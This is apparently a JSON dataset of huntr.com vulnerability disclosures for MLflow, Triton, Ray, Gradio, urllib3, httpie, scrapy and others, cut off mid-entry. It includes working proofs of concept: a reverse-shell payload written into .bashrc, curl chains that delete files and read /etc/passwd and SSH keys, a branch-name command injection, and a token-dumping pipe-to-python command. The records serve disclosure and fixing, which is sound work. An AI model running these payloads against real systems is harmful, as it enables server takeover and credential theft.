..."}, "https://huntr.com/bounties/0acdd745-0167-4912-9d5c-02035fe5b314/": {"cve": "CVE-2023-6831", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6831", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "High (8.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1", "description": "As the framework is quite complex, I'm going to take the default configuration as reference for the whole report\n\ud83d\udd12\ufe0f Requirements\nNone: by default no authentication is required.\n  \ud83d\udcdd Description\nIn addition of model, experiments, runs... management, MLFlow UI allows to manage artifacts:\n- Upload: curl -X POST -H 'Content-Type: A/A' -d 'A' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/upload-artifact?run_uuid=<UUID>&path=<PATH>' - List: curl 'http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts?path=<PATH>' - Delete: curl -X DELETE 'http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/<PATH> (Btw, there is a mistake in the comments (permalink))\nIn the default configuration, it uses local storage (./mlartifacts) to store them.\n  When deleting an artifact, it will create the following execution flow:\n1. Delete artifact route: (permalink)\ndef _delete_artifact_mlflow_artifacts(artifact_path):\n    validate_path_is_safe(artifact_path)\n    _get_request_message(DeleteArtifact())\n    artifact_repo = _get_artifact_repo_mlflow_artifacts()\n    artifact_repo.delete_artifacts(artifact_path)\n    # ...\n    return response\n2. Verify artifact_path using validate_path_is_safe function. It will ensure that artifact_path isn't absolute or doesn't contain any ... (permalink)\n3. Delete artifacts from LocalArtifactRepository class: (permalink)\ndef delete_artifacts(self, artifact_path=None):\n    artifact_path = local_file_uri_to_path(\n        os.path.join(self._artifact_dir, artifact_path) if artifact_path else self._artifact_dir\n    )\n\n    if os.path.exists(artifact_path):\n        shutil.rmtree(artifact_path)\n4. As you can see in the last snippet, before removing the directory / file, it converts the normalize using local_file_uri_to_path: (permalink)\ndef local_file_uri_to_path(uri):\n    path = uri\n    if uri.startswith(\"file:\"):\n        parsed_path = urllib.parse.urlparse(uri)\n        path = parsed_path.path\n        # Fix for retaining server name in UNC path.\n        if is_windows() and parsed_path.netloc:\n            return urllib.request.url2pathname(rf\"\\\\{parsed_path.netloc}{path}\")\n    return urllib.request.url2pathname(path)\nThe problem in the local_file_uri_to_path is that its use urllib.request.url2pathname to normalize the path. Therefore, looking into the python documentation we can see that it decodes URL encoded strings: (doc)\nAs the path is unquote before using it, it is possible to bypass the validate_path_is_safe function check by url encoding .. (%2E%2E).\n  \ud83d\udca5 Proof of Concept\nCreate a folder with content anywhere on your file system:\nmkdir /tmp/secret\ntouch /tmp/secret/file\nStart the mlflow web server:\nmlflow ui --host 127.0.0.1:5000\nTrigger the issue to delete the folder:\ncurl -X DELETE 'http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Ftmp%252Fsecret'\nNow the folder should be removed:\n  \ud83d\uddbc\ufe0f Models Impact\nThis issue can be used to remove any file on the vulnerable server's system including model information.\n  \ud83d\udee0\ufe0f Fix suggestion\nDo not normalize the path before using it or check decoded path content in validate_path_is_safe.\nImpact\nA malicious user could abuse this vulnerability to remove any file on the victim server (depending on user's rights)."}, "https://huntr.com/bounties/b27148e3-4da4-4e12-95ae-756d33d94687/": {"cve": "CVE-2023-31036", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-31036", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/triton-inference-server/server", "fix_commit": "https://www.github.com/triton-inference-server/server/commit/6dfa3e72018fad6b01f45a7c776dfea1178c9a34", "description": "Description\nTriton-inference-server/server exposes the HTTP interface and grpc interface for network interaction. Through the API interface, the hacker can upload any file to any location on server without authorization. In the POC, we uploaded and overwritten the /root/.bashrc file to obtain a rebound shell and fully control the server.\nReproduction steps\npull the docker image from nvida repo;\nrun the container with explicit mode;\nlisten 4444 port on hacker's server to wait for container visit;\nrun poc to interact with vulnearable API on container;\nwhen normal user login bash, it will trigger reverse shell on hacker's server.\nProof of Concept\nimport requests\nimport base64\n\ntriton_server_api = 'http://localhost:8000/v2/repository/models/simple/load'\nreverse_shell_host = '172.17.0.1'\npayload = 'nohup bash -i >& /dev/tcp/' + reverse_shell_host + '/4444  0>&1 & \\n'\n\ndata = {\n    \"parameters\": {\n        \"config\": \"\",\n        \"file:../../root/.bashrc\": base64.b64encode(payload.encode()).decode()\n    }\n}\n\nprint(data)\nresp = requests.post(url=triton_server_api, json=data)\nprint(resp.status_code)\nImpact\nOverwrite arbitrary files or even take over the server"}, "https://huntr.com/bounties/5039c045-f986-4cbc-81ac-370fe4b0d3f8/": {"cve": "CVE-2023-6021", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6021", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ray-project/ray", "fix_commit": "https://www.github.com/ray-project/ray/commit/2a6c6ee032701e49bcebd1df1a400f70fddb0cc7", "description": "Description\nAttackers can read any file on the system with the permissions of the user that started the Ray Dashboard.\nProof of Concept\nGET /api/v0/logs/file?node_id=56424ecdb00cf570f0831aa698dd7c44e527a20212d2fa27078c7f79&filename=../../../../../etc%2fpasswd&lines=50000 HTTP/1.1\nHost: localhost:8265\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nReferer: http://localhost:8265/\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\nDate: Thu, 24 Aug 2023 21:49:54 GMT\nServer: Python/3.8 aiohttp/3.8.5\nConnection: close\nContent-Length: 8225\n\n1##\n# User Database\n# \n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\nfakeuser:*:99:99:Fake User:/Users/danmcinerney/fakeuser:/bin/sh\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\nImpact\nAllows attackers to remotely read any file on the system depending on the permissions of the user that started Ray."}, "https://huntr.com/bounties/b12b0073-0bb0-4bd1-8fc2-ec7f17fd7689/": {"cve": "CVE-2023-2780", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-2780", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/fae77a525dd908c56d6204a4cef1c1c75b4e9857", "description": "Description\nThis is a bypass to the following submission https://huntr.dev/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28/ which was assigned CVE-2023-1177.\nProof of Concept\nStart the server or UI (it works on both identically)\nmlflow ui --host 127.0.0.1:5000\nCreate a Model named \"AJAX-API\".\ncurl -i -s -k -X $'POST'  -H $'Host: 127.0.0.1:5000' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0' -H $'Accept: /' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:5000/' -H $'Content-Type: application/json; charset=utf-8' -H $'Origin: http://127.0.0.1:5000' -H $'Connection: close' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin'  --data-binary $'{\"name\":\"AJAX-API\"}'  $'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\nRegister Model Version and notice the \"source\" JSON property in the request contains file://./etc/. If file:///etc/ is used an exception is thrown due to the check present in is_local_uri method.\ncurl -i -s -k -X $'POST'  -H $'Host: 127.0.0.1:5000' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0' -H $'Accept: /' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:5000/' -H $'Content-Type: application/json; charset=utf-8' -H $'Origin: http://127.0.0.1:5000' -H $'Connection: close' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin'  --data-binary $'{\"name\":\"AJAX-API\",\"source\":\"file://./etc/\"}'  $'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create\nResponse:\n{\n  \"model_version\": {\n    \"name\": \"AJAX-API\",\n    \"version\": \"1\",\n    \"creation_timestamp\": 1679914680236,\n    \"last_updated_timestamp\": 1679914680236,\n    \"current_stage\": \"None\",\n    \"description\": \"\",\n    \"source\": \"file://./etc/\",\n    \"run_id\": \"\",\n    \"status\": \"READY\",\n    \"run_link\": \"\"\n  }\n}\nNote the version number from the previous response and make the following cURL request. curl http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=AJAX-API&version={{version number}}\nNotice the contents of /etc/passwd file in the response.\nImpact\nReading arbitrary sensitive files on the server."}, "https://huntr.com/bounties/1fe8f21a-c438-4cba-9add-e8a5dab94e28/": {"cve": "CVE-2023-1177", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-1177", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "Critical (9.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/7162a50c654792c21f3e4a160eb1a0e6a34f6e6e", "description": "Description\nLocal and Remote File Include in MLflow\nProof of Concept\nStart the server or UI (it works on both identically)\nmlflow ui --host 127.0.0.1:5001\nCreate a model\ncurl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:5001' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0' -H $'Accept: /' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:5001/' -H $'Content-Type: application/json; charset=utf-8' -H $'Content-Length: 19' -H $'Origin: http://127.0.0.1:5001' -H $'Connection: close' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' \\ --data-binary $'{\\\"name\\\":\\\"AJAX-API\\\"}' \\ $'http://127.0.0.1:5001/ajax-api/2.0/mlflow/registered-models/create'\nArbitrary \"name\" parameter to be used in the following two requests.\nCreate a model version\ncurl -i -s -k -X $'POST' \\ -H $'Host: 127.0.0.1:5001' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0' -H $'Accept: /' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://127.0.0.1:5001/' -H $'Content-Type: application/json; charset=utf-8' -H $'Content-Length: 55' -H $'Origin: http://127.0.0.1:5001' -H $'Connection: close' -H $'Sec-Fetch-Dest: empty' -H $'Sec-Fetch-Mode: cors' -H $'Sec-Fetch-Site: same-origin' \\ --data-binary $'{\\\"name\\\":\\\"AJAX-API\\\",\\\"source\\\":\\\"file:///home/danmcinerney/.ssh\\\"}' \\ $'http://127.0.0.1:5001/ajax-api/2.0/mlflow/model-versions/create'\nThis is where we set the folder that we want access to. In this case I set the JSON parameter \"source\" to \"file:///home/danmcinerney/.ssh\" so that I can access the ssh private keys.\nGet artifacts\ncurl -i -s -k -X $'GET' \\ -H $'Host: 127.0.0.1:5001' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: none' -H $'Sec-Fetch-User: ?1' \\ $'http://127.0.0.1:5001/model-versions/get-artifact?path=id_rsa&name=AJAX-API&version=1'\nThe \"path\" URL parameter can now be set to any file in the folder specified in the previous request's \"source\" JSON parameter. Note that you can also access other network resources by setting the previous requests' \"source\" path to things like \"s3://bucket/model.pkl/\" which extends this from just local file include to remote file include as well.\nThis works out of the box on a default installation remotely and with no authentication.\nThis bug was privately disclosed to MLflow via their Security policy of emailing mlflow-oss-maintainers@databricks.com already so no need to contact them again. It has been fixed in the 2.2.1 release. This report is for the CVE submission.\nImpact\nReading arbitrary sensitive files on the server. Additionally, reading arbitrary files on the remote artifact store server. Because MLflow is most often configured to use an S3 bucket (per research on publicly available MLflow instances found via Shodan) this means AWS account credentials can also be stolen in the majority of deployments. System takeover and RCE is possible via stealing the private SSH keys from the server."}, "https://huntr.com/bounties/21d2ff0c-d43a-4afd-bb4d-049ee8da5b5c/": {"cve": "CVE-2023-6572", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6572", "cwe": "CWE-77: Command Injection", "cwe_link": "https://cwe.mitre.org/data/definitions/77.html", "severity_score": "Critical (9.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/gradio-app/gradio", "fix_commit": "https://www.github.com/gradio-app/gradio/commit/5b5af1899dd98d63e1f9b48a93601c2db1f56520", "description": "Summary\nThe generate-changeset.yml github actions workflow is vulnerable to unauthorised modification of the base repository and secret exfiltration (GITHUB_TOKEN).\nThe untrusted user input github.event.workflow_run.head_branch is used in a privileged context of the workflow in an insecure way which can lead to command injection in workflow runner.\nDetails\nThe workflow is triggered by workflow_run trigger.\nname: Generate changeset\non:\n  workflow_run:\n    workflows: [\"trigger changeset generation\"]\n    types:\n      - completed\nThis trigger acts as a callback when another workflow finishes. In this case the vulnerable Generate changeset workflow is triggered when the trigger changeset generation workflow finishes.\nIn order to trigger this workflow, the attacker needs to\nFork the vulnerable repository.\nCreate a branch name with attacker payload. A branch name can be a shell command (can be reverse shell) as explained here. zzz\";echo${IFS}\"hello\";#\nOpen a pull request to the base repository.\nThe vulnerable fragment resides in the get-pr job of Generate changeset workflow.\nname: Generate changeset\non:\n  workflow_run:\n    workflows: [\"trigger changeset generation\"]\n    types:\n      - completed\n    [ . . . Skipped]\n    steps:\n    - name: echo concurrency group\n      run: echo ${{ github.event.workflow_run.head_repository.full_name }}::${{ github.event.workflow_run.head_branch }}\n        [ . . . Skipped]\nThe issue here is that the run operation generates a temporary shell script based on the template. The expressions inside of ${{ }} are evaluated and substituted with the resulting values before the shell script is run which may make it vulnerable to shell command injection.\nSo the attackers payload (reverse shell) will be executed here.\nNote: I did not reproduce this vulnerability as I need to send a public PR.\nImpact\nAt the start of each workflow job, GitHub automatically creates a unique GITHUB_TOKEN secret to use in your workflow. You can use the GITHUB_TOKEN to authenticate in the workflow job.\nOnce the attacker gets RCE, the GITHUB_TOKEN value can be extracted from Runner.Worker process using the below command.\ncurl -sSf https://gist.githubusercontent.com/nikitastupin/30e525b776c409e03c2d6f328f254965/raw/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' \nThere is also another token used in the workflow. ${{ secrets.COMMENT_TOKEN }} which can be stolen.\nAnyone with a github account can exploit this vulnerability.\nThe GITHUB_TOKEN has read and write permissions to repository. Proof from this workflow run\nUsing GITHUB_TOKEN an attacker can push to base repository or manipulate in some other way.\nYou may have branch protection enabled in the repository. Particularly you may have the require pull request reviews before merging rule enabled.\nHowever the rule can be bypassed using the GITHUB_TOKEN because the token has write access to the repository thus can approve pull malicious pull requests.\nThe bypass won't work if the code owner's approval is required on all files, In this case a malicious user still should be able to push to a non-protected branch (or create a new one) to create a release/tag out of it infecting the supply chain.\nNote : In order to exploit the vulnerability attacker needs to be able to run workflows, some repositories may require workflows from first-time contributors to be approved by repository maintainer. This limitation is added to prevent crypto miners, so it can be bypassed by simply contributing a legitimate pull_request (fixing typos) and then issuing attack.\nRemediation\nThe best practice to avoid code and command injection vulnerabilities in GitHub workflows is to set the untrusted input value of the expression to an intermediate environment variable:\n- name: print title\n  env:\n    TITLE: ${{ github.event.issue.title }}\n  run: echo \"$TITLE\"\nI can send a PR to fix this. Please let me know if you want me to do so."}, "https://huntr.com/bounties/65563cbd-0577-4737-847a-0401921243bd/": {"cve": "", "cve_link": "", "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor", "cwe_link": "https://cwe.mitre.org/data/definitions/200.html", "severity_score": "Medium (4.2)\nAttack vector\nAdjacent\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/urllib3/urllib3", "fix_commit": "https://www.github.com/urllib3/urllib3/commit/4e50fbc5db74e32cabd5ccc1ab81fc103adfe0b3", "description": "BUG\npost body leaked to third party site when 303 redirect happen\nSUMMURY\nas per specification provided https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections during redirection of 303 POST request, body should be lost and request method should be GET .\n\ncheck the above url for 303 redirect\n\"GET methods unchanged. Others changed to GET (body lost).\"\n\\ So, POST body should be lost during 303 redirect .\nBut for urllib3 it does not lost the POST body and it leaks to third party site .\nAlthough the request method is changed to GET(which is fine as per specification) but no POST body lost .\n\ni checked other http-client like curl,python-requests,nodejs fetch,faraday,guzzle etc and they all are working properly .\nSTEP TO RERPODUCE\nsetup a 303 redirect server\n\\\nhttp://mysite.com/redirect.php?url=http://localhost:8182/&status_code=303\n//redirect.php\n<?php\nif(isset($_REQUEST['url'])){\n    $url=$_REQUEST[\"url\"];\n}\nif(isset($_REQUEST['status_code'])){\n    $code=(int)$_REQUEST[\"status_code\"];\n    http_response_code($code);\n}\nheader(\"Location: $url\");\n/* Make sure that code below does not get executed when we redirect. */\nexit;\n?>\nsetup a netcat listner server on nc -lnvp 8182\n\\\nrun bellow code \\\nimport urllib3\nhttp = urllib3.PoolManager(cert_reqs='CERT_NONE')\nversion=urllib3.__version__\nprint(\"==========\"+version+\" =======\")\nr=http.request('POST','http://mysite.com/redirect.php?url=http://localhost:8182/&status_code=303',encode_multipart=False,headers={\"Cookie\":\"sdf=sdjjj\"},fields={\"hello\": \"world\"})\nprint(r.data)\nresponse in netcat server\nGET / HTTP/1.1\nHost: localhost:8182\nAccept-Encoding: identity\nContent-Length: 11\nUser-Agent: python-urllib3/2.0.6\nAUffthorization: dassd=add\nContent-Type: application/x-www-form-urlencoded\n\nhello=world\nsee here postdata leaked to thirdparty site\nImpact\npost body leaked to third party site when 303 redirect happen"}, "https://huntr.com/bounties/67707b24-24a9-4b0b-999e-5316b956828b/": {"cve": "CVE-2023-43804", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-43804", "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor", "cwe_link": "https://cwe.mitre.org/data/definitions/200.html", "severity_score": "Medium (5.9)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/urllib3/urllib3", "fix_commit": "https://www.github.com/urllib3/urllib3/commit/644124ecd0b6e417c527191f866daa05a5a2056d", "description": "BUG\nCookie header leaked to third party site and it allow to hijack victim account\nAFFECTED VERSION\nurllib3 2.0.4\nSUMMURY\nWhen fetching a remote url with Cookie if it get Location response header then it will follow that url and try to fetch that url with provided cookie . So cookie is leaked here to thirdparty.\nEx: you try to fetch example.com with cookie and if it get redirect url to attacker.com then it fetch that redirect url with provided cookie .\nSo, Cookie of example.com is leaked to attacker.com .\nCookie is standard way to authentication into webapp and you should not leak to other site .\nAll browser follow same-origin-policy so that when redirect happen browser does not send cookie of example.com to attacker.com .\nFLOW\nif you fetch http://mysite.com/redirect.php?url=http://attacker.com:8182/ then it will redirect to http://attacker.com:8182/ .\nFirst setup a webserver and a netcat listner\nhttp://mysite.com/redirect.php?url=http://attacker.com:8182/\n//redirect.php\n<?php\n$url=$_GET[\"url\"];\nheader(\"Location: $url\");\n\n/* Make sure that code below does not get executed when we redirect. */\nexit;\n?>\nnetcat listner in http://attacker.com\nnc -lnvp 8182\nSTEP TO RERPODUCE\nrun bellow code\nimport urllib3\nhttp = urllib3.PoolManager()\nr=http.request('GET','http://mysite.com/redirect.php?url=http://attacker.com:8182/ss',headers={\"Cookie\":\"sdf=sd\"})\nresponse received in attacker netcat\nGET /ss HTTP/1.1\nHost: attacker.com:8182\nAccept-Encoding: identity\nCookie: sdf=sd\nUser-Agent: python-urllib3/2.0.4\nYou can see here it leaks cookie to thirdparty site attacker.com So, here i provided cookie for mysite.com but does to redirect it leaks to thirdparty site attacker.com\nSUGGESTED FIX\nIf provided url domain and redirect url domain is same then you can only send cookie/authorization header to redirected url . But if the both domain not same then its a third party site which will be redirected, so you dont need to send Cookie/Authorization header.\nImpact\nCookie header leaked to third party site and it allow to hijack victim account"}, "https://huntr.com/bounties/208a096f-7986-4eed-8629-b7285348a686/": {"cve": "CVE-2023-0440", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0440", "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor", "cwe_link": "https://cwe.mitre.org/data/definitions/200.html", "severity_score": "Medium (5.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/healthchecks/healthchecks", "fix_commit": "https://www.github.com/healthchecks/healthchecks/commit/359edbd2709e27b60687061a32e19322bc971c1f", "description": "Description\nThe sending a magic sign in link functionality is vulnerable to an email enumeration attack.\nProof of Concept\nIf you enter registered email, you will get Login Link Sent! message.\nIf you enter non-registered email, you will get Unknown email address. message.\nImpact\nEmail enumeration allows an attacker to find valid usernames/emails on the victim application. It can use this information to do more advanced attacks like bruteforcing passwords or phishing attemps."}, "https://huntr.com/bounties/dafb2e4f-c6b6-4768-8ef5-b396cd6a801f/": {"cve": "CVE-2022-0430", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0430", "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor", "cwe_link": "https://cwe.mitre.org/data/definitions/200.html", "severity_score": "Low (2.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/httpie/httpie", "fix_commit": "https://www.github.com/httpie/httpie/commit/65ab7d5caaaf2f95e61f9dd65441801c2ddee38b", "description": "Description\nAll cookies saved to session storage are supercookies.\nProof of Concept\n# in /etc/hosts\n127.0.0.1       host1.example.com\n127.0.0.1       host2.example.net\n\n#headers-helper.rpy; run with `twist web --resource-script=` and it'll run on 8080\nfrom pprint import pformat\nfrom twisted.web.resource import Resource\n\nclass MyResource(Resource):\n\n    def getChild(self, path, request):\n        return self\n\n    def render_GET(self, request):\n        hostHeader = b\"\".join(request.requestHeaders.getRawHeaders(b\"host\"))\n        request.setHeader(b\"content-type\", b\"text/plain\")\n        if hostHeader is not None:\n            thisHost = hostHeader.decode('charmap')\n        else:\n            thisHost = u'HOST NOT SET'\n        request.addCookie(\"from-\" + thisHost, thisHost.encode(\"charmap\"))\n        if request.requestHeaders.getRawHeaders(b'host') != [b'host2.example.net:8080']:\n            request.redirect(b'http://host2.example.net:8080/2')\n        return (thisHost + \"\\n\\n\" + pformat(dict(request.requestHeaders.getAllRawHeaders()))).encode(\"utf-8\")\n\nresource = MyResource()\n\n# then, on the command line, if you run this twice\n$ http --follow --all --session ./session-state get http://host1.example.com:8080\nHTTP/1.1 302 Found\nContent-Length: 193\nContent-Type: text/plain\nDate: Mon, 24 Jan 2022 08:32:22 GMT\nLocation: http://host2.example.net:8080/2\nServer: TwistedWeb/21.7.0\nSet-Cookie: from-host1.example.com:8080=host1.example.com:8080\n\nhost1.example.com:8080\n\n{b'Accept': [b'*/*'],\n b'Accept-Encoding': [b'gzip, deflate'],\n b'Connection': [b'keep-alive'],\n b'Host': [b'host1.example.com:8080'],\n b'User-Agent': [b'HTTPie/2.6.0']}\n\n\nHTTP/1.1 200 OK\nContent-Length: 193\nContent-Type: text/plain\nDate: Mon, 24 Jan 2022 08:32:22 GMT\nServer: TwistedWeb/21.7.0\nSet-Cookie: from-host2.example.net:8080=host2.example.net:8080\n\nhost2.example.net:8080\n\n{b'Accept': [b'*/*'],\n b'Accept-Encoding': [b'gzip, deflate'],\n b'Connection': [b'keep-alive'],\n b'Host': [b'host2.example.net:8080'],\n b'User-Agent': [b'HTTPie/2.6.0']}\n\n$ http --follow --all --session ./session-state get http://host1.example.com:8080\nHTTP/1.1 302 Found\nContent-Length: 331\nContent-Type: text/plain\nDate: Mon, 24 Jan 2022 08:32:26 GMT\nLocation: http://host2.example.net:8080/2\nServer: TwistedWeb/21.7.0\nSet-Cookie: from-host1.example.com:8080=host1.example.com:8080\n\nhost1.example.com:8080\n\n{b'Accept': [b'*/*'],\n b'Accept-Encoding': [b'gzip, deflate'],\n b'Connection': [b'keep-alive'],\n b'Cookie': [b'from-host1.example.com:8080=host1.example.com:8080; from-host2.e'\n             b'xample.net:8080=host2.example.net:8080'],\n b'Host': [b'host1.example.com:8080'],\n b'User-Agent': [b'HTTPie/2.6.0']}\n\n\nHTTP/1.1 200 OK\nContent-Length: 331\nContent-Type: text/plain\nDate: Mon, 24 Jan 2022 08:32:26 GMT\nServer: TwistedWeb/21.7.0\nSet-Cookie: from-host2.example.net:8080=host2.example.net:8080\n\nhost2.example.net:8080\n\n{b'Accept': [b'*/*'],\n b'Accept-Encoding': [b'gzip, deflate'],\n b'Connection': [b'keep-alive'],\n b'Cookie': [b'from-host1.example.com:8080=host1.example.com:8080; from-host2.e'\n             b'xample.net:8080=host2.example.net:8080'],\n b'Host': [b'host2.example.net:8080'],\n b'User-Agent': [b'HTTPie/2.6.0']}\nNote the presence of the from-host1.example.com in the output from the second request.\nImpact\nAll cookies set by any site in a persistent session will be visible to all sites in that session, as all domain-binding is stripped in the persistence process"}, "https://huntr.com/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/": {"cve": "CVE-2022-0577", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-0577", "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor", "cwe_link": "https://cwe.mitre.org/data/definitions/200.html", "severity_score": "High (8.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/scrapy/scrapy", "fix_commit": "https://www.github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a", "description": "BUG\nCookie header leaked to third party site and it allow to hijack victim account\nSUMMURY\nWhen you crawling a site with cookie and it received Location header to redirect then scrappy send all cookie to this redirect url even if this is different domain . But every browser works different way . browser does not send cookie of one domain to other domain due to same-origin-policy . As cookie is main way for user authentication ,so if cookie is leaked then attacker can performed any action using those leaked cookie . But here scrapy leaked cookie to thirdparty site if redirect happen .\nFLOW\nif you fetch http://mysite.com/redirect.php?url=http://attacker.com:8182/ then it will redirect to http://attacker.com:8182/ .\nFirst setup a webserver and a netcat 